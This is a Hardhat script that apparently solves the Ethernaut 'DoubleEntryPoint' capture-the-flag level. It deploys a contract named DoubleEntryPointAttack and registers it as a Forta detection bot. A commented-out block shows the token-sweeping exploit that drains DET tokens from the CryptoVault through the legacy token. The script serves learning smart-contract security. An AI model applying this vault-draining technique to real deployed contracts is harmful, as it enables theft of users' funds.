import { ethers } from "hardhat";
import { DoubleEntryPoint__factory } from "../typechain/factories/contracts/DoubleEntryPoint.sol/DoubleEntryPoint__factory";
import { CryptoVault__factory } from "../typechain/factories/contracts/DoubleEntryPoint.sol/CryptoVault__factory";
import { LegacyToken__factory } from "../typechain/factories/contracts/DoubleEntryPoint.sol/LegacyToken__factory";
import { Forta__factory } from "../typechain/factories/contracts/DoubleEntryPoint.sol/Forta__factory";
import { DoubleEntryPointAttack__factory } from "../typechain/factories/contracts/DoubleEntryPointAttack__factory";


async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0xFc0004A6C66dF087255E0C4b83396D88DE794CfE";
    let dep = new DoubleEntryPoint__factory(signer).attach(instance_address);
    let cryptoVaultAddr = await dep.cryptoVault();
    let cryptoVault = new CryptoVault__factory(signer).attach(cryptoVaultAddr);
    let lgtAddr = await dep.delegatedFrom();
    let lgt = new LegacyToken__factory(signer).attach(lgtAddr);
    let depCount = await dep.balanceOf(cryptoVault.address);
    let lgtCount = await lgt.balanceOf(cryptoVault.address);

    // attack
    // console.log('underlying:',await cryptoVault.underlying());
    // console.log('delegate:', await lgt.delegate());
    // console.log("dep in vault:", ethers.utils.formatEther(depCount.toString()));
    // console.log("lgt in vault", ethers.utils.formatEther(lgtCount.toString()));
    // console.log('sweptTokensRecipient:', await cryptoVault.sweptTokensRecipient());
    // let tx = await cryptoVault.sweepToken(lgt.address);
    // await tx.wait();
    // depCount = await dep.balanceOf(cryptoVault.address);
    // lgtCount = await lgt.balanceOf(cryptoVault.address);
    // console.log("dep in vault:", ethers.utils.formatEther(depCount.toString()));
    // console.log("lgt in vault", ethers.utils.formatEther(lgtCount.toString()));
    

    let attack = await new DoubleEntryPointAttack__factory(signer).deploy();
    await attack.deployed();
    let tx = await attack.setVaultAddr(cryptoVault.address);
    await tx.wait();
    
    let fortaAddr = await dep.forta();
    let forta = new Forta__factory(signer).attach(fortaAddr);
    tx = await forta.setDetectionBot(attack.address);
    await tx.wait()

    tx = await cryptoVault.sweepToken(lgt.address);
    await tx.wait();    
}   

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
